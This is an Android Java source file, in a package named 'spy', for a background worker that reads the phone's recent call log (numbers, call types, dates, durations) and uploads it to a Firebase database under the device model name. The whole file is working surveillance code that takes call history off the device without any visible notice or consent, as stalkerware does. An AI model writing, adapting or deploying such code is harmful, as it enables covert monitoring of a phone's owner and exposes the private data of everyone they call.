package com.example.spy;

import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.provider.CallLog;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.database.FirebaseDatabase;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

public class UploadWorker extends Worker {
    private static final String TAG = "UploadWorker";

    public UploadWorker(@NonNull Context context, @NonNull WorkerParameters params) {
        super(context, params);
    }

    @NonNull
    @Override
    public Result doWork() {
        Log.i(TAG, "doWork: inside dowork()");

        getCallDetails();

        // Indicate whether the work finished successfully with the Result
        return Result.success();
    }

    public void getCallDetails() {
        Log.i(TAG, "getCallDetails: inside getCallDetails");
        StringBuilder stringBuffer = new StringBuilder();
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Calendar calender1 = Calendar.getInstance();
        calender1.set(Calendar.HOUR, -1);
        String fromDate = String.valueOf(calender1.getTimeInMillis());

        Calendar calendar2 = Calendar.getInstance();
        String toDate = String.valueOf(calendar2.getTimeInMillis());

        String[] whereValue = {fromDate, toDate};


        Cursor managedCursor = getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI, null, android.provider.CallLog.Calls.DATE + " BETWEEN ? AND ?", whereValue, strOrder);

        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

        stringBuffer.append("Call Log :");

        while (managedCursor.moveToNext()) {
            String phoneNumber = managedCursor.getString(number);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MMM-yyyy HH:mm");
            String dateString = formatter.format(new Date(Long
                    .parseLong(callDate)));
            //  Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);

            String dir = null;

            int dirCode = Integer.parseInt(callType);

            switch (dirCode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED CALL";
                    break;

            }

            stringBuffer.append("\nPhone Number:--- ").append(phoneNumber).append("\nCall Type:--- ").append(dir).append("\nCall Date:---").append(dateString).append("\nCall Duration:---").append(callDuration);
            stringBuffer.append("\n--------------------------");

        }
        managedCursor.close();
        writeToFirebase(stringBuffer.toString());
    }

    private void writeToFirebase(String callDetails) {
        Log.i(TAG, "writeToFirebase: inside");
        String currentDateTimeString = DateFormat.getDateTimeInstance().format(new Date());
        FirebaseDatabase.getInstance().getReference().child(Build.MODEL).child(currentDateTimeString).setValue(callDetails);
    }
}
